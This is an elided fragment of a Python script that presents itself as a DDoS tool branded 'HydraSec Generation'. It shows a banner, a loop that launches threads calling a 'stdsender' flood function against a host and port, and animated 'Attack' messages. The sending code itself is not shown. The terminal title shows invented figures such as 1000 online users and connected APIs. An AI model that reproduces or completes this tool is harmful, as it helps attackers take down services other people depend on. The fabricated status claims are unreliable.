...
raw = """
\033[0;36m                              TOOLS BY HydraSec Generation
\033[0;36m            ╔══════════════════════════╦════════════════════════════╗
...
\033[0;36m                              
\033[0;36m =============HydraSec CREATED THIS DDOS======================"""
...
def main():
	...
	while True:
		...
		sys.stdout.write("\x1b]2;[-] HydraSecTools | Api Connected [5] | Backup Server [1] | Online User [1000] | Admin: [Sixninesix] | POWER : {}% [UNSTABLE]\x07".format (powerran))
		...
		if sinput == "cls":
			...
			try:
				if running >= 20000:
					...
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[91m[-] HydraSec Generation Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[91m[\] HydraSec Generation Attack..")
					time.sleep(1)
					...
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] HydraSec Generation Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] HydraSec Generation Attack...")
					time.sleep(1)
